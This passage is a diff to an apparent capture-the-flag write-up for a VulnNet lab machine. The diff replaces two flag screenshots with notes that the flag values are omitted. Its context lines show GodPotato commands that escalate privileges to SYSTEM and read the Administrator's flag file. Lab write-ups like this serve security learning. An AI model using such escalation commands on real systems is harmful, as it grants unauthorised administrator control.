@@ -141,7 +141,7 @@ Shell obtained as **vulnnet\enterprise-security**.
 
 ## 8. User Flag
 
-<img src="10_user_flag.png" width="800">
+User flag recovered from enterprise-security's profile. Flag value omitted from this writeup.
 
 ---
 
@@ -171,7 +171,7 @@ C:\Users\enterprise-security\Downloads\GodPotato-NET4.exe -cmd "cmd /c whoami"
 C:\Users\enterprise-security\Downloads\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
 ```
 
-<img src="12_system_flag.png" width="800">
+System flag recovered through the GodPotato SYSTEM command. Flag value omitted from this writeup.
 
 ---
 
